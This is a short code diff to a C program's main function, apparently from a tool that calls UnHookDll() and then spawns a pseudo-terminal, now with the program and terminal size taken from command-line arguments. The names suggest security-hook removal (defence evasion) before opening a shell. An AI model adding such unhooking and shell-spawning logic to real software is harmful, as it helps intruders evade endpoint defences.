@@ -15,12 +15,16 @@
 #include "hijacking.h"
 #include "spawn.h"
 
-int main()
+int main(int argc, char* argv[])
 {
     int iRes = -1;
-    UnHookDll();
-    Sleep(15000);
-    iRes = SUCCEEDED(SpawnPty(64, 236, _T("cmd.exe")));
+    if (argc == 4)
+    {
+        int iRows = atoi(argv[2]);
+        int iCols = atoi(argv[3]);
+        UnHookDll();
+        iRes = SUCCEEDED(SpawnPty(argv[1], iRows, iCols)) ? 0 : -1;
+    }
     return iRes;
 }
 
